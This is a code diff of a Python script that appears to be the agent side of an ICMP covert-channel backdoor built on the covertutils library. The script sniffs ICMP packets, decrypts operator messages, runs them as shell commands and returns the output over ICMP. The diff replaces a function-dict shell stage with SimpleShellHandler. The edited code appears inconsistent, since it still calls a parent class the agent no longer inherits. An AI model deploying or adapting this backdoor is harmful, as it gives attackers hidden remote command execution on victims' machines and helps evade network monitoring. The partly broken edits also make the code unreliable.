@@ -3,7 +3,7 @@
 
 from covertutils.orchestration import SimpleOrchestrator
 from covertutils.handlers import ResponseOnlyHandler, FunctionDictHandler
-from covertutils.payloads import CommonStages
+from covertutils.handlers.impl import SimpleShellHandler
 
 from scapy.all import sniff, IP, ICMP, Raw		# Never bloat scapy import with *
 from scapy.all import send as scapy_send	# unexpected things will happen
@@ -63,15 +63,15 @@ sniff_thread.start()			# Run the ICMP echo collector in a thread
 #============================== Handler Overriding part ===================
 
 # A dict that designates what function is going to run if Messages come from certain streams
-_function_dict = { 'control' : CommonStages['shell']['function'],
-					'main' : CommonStages['shell']['function']
-					}
+# _function_dict = { 'control' : CommonStages['shell']['function'],
+# 					'main' : CommonStages['shell']['function']
+# 					}
 # Here all streams will be used for a typical 'system' function (raw shell).
 # FEEL FREE TO CREATE YOUR OWN!
 
 #	ResponseOnlyHandler because the Agent never sends packet adHoc but only as responses
 #	FunctionDictHandler to set the dict of functions run on messages
-class AgentHandler( ResponseOnlyHandler, FunctionDictHandler ) :
+class AgentHandler( ResponseOnlyHandler, SimpleShellHandler ) :
 
 	def onNotRecognised( self ) :	# When Junk arrives
 		global packet_info	# It means that the packet is not created by Handler
@@ -90,13 +90,13 @@ class AgentHandler( ResponseOnlyHandler, FunctionDictHandler ) :
 		if message == self.request_data :	# If the Message contains the `self.request_data` string
 			ret_stream, ret_message = stream, message	# The message to be responded will contain the same value
 		else :		# Else pass it through the function pointed by the function dict
-			ret_stream, ret_message = FunctionDictHandler.onMessage( self, stream, message )
+			ret_message = FunctionDictHandler.onMessage( self, stream, message )
 
-		responded = ResponseOnlyHandler.onMessage( self, ret_stream, ret_message )	# Run the ResponseOnlyHandler onMessage
+		responded = ResponseOnlyHandler.onMessage( self, stream, ret_message )	# Run the ResponseOnlyHandler onMessage
 		# That automatically responds with the next Message in queue when called. (Always responding to messages behavior)
 		if not responded :		# If the message was real data (not 'ResponseOnlyHandler.request_data' string), the Parent Class didn't respond
-			self.queueSend( ret_message, ret_stream );	# Make it respond anyway with 'ResponseOnlyHandler.request_data' (see Client)
-			responded = ResponseOnlyHandler.onMessage( self, ret_stream, ret_message )	# Now it will responde for sure as a message is manually added to the queue
+			self.queueSend( ret_message, stream );	# Make it respond anyway with 'ResponseOnlyHandler.request_data' (see Client)
+			responded = ResponseOnlyHandler.onMessage( self, stream, ret_message )	# Now it will responde for sure as a message is manually added to the queue
 			assert responded == True		# This way we know it responsed!
 #==========================================================================
 
@@ -112,8 +112,8 @@ orchestrator = SimpleOrchestrator( passphrase,	# Encryption keys generated from 
 				reverse = False )	# Reverse the encryption channels - Handler has `reverse = True`
 
 agent = AgentHandler( recv, send, orchestrator,			# Instantiate the Handler object. Finally!
-					function_dict = _function_dict ) 	# needed as of the FunctionDictHandler overriding
-
+					# function_dict = _function_dict,  	# needed as of the FunctionDictHandler overriding
+					)
 #==========================================================================
 
 
